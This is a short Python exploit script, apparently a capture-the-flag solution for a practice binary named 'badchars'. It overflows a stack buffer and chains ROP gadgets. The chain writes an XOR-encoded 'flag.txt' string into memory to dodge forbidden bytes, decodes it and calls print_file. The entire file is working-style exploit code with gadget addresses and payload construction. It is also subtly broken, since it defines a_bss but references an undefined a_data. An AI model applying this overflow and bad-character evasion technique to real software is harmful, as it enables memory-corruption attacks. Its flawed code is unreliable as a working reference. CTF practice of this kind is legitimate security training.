#!/usr/bin/env python3
# badchars are: 'x', 'g', 'a', '.'

from pwn import *

elf = context.binary = ELF("./badchars")

# Addresses
a_print_file = p64(elf.symbols["usefulFunction"] + 9)
a_bss = 0x0000000000601038

# Gadgets
POP_RDI = p64(0x00000000004006a3) # pop rdi ; ret
POP_R12_R15 = p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
POP_R14_R15 = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
MOV_R13_R12 = p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret
XOR_R15_R14 = p64(0x0000000000400628) # xor byte ptr [r15], r14b ; ret;

# Stage 1: Write XORed flag to data section
payload = b"A" * 0x28
payload += POP_R12_R15
payload += b"dnce,vzv" # flag.txt xored w/ key of 2
payload += p64(a_data)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0xdeadbeefdeadbeef)
payload += MOV_R13_R12

# Stage 2: XOR flag back to plaintext
for i in range(len("flag.txt")):
    print(i)
    payload += POP_R14_R15
    payload += p64(0x2)
    payload += p64(a_data + i)
    payload += XOR_R15_R14

# Stage 3: Call print_file
payload += POP_RDI
payload += p64(a_data)
payload += a_print_file

# Send payload
p = process(elf.path)
p.sendline(payload)
p.interactive()
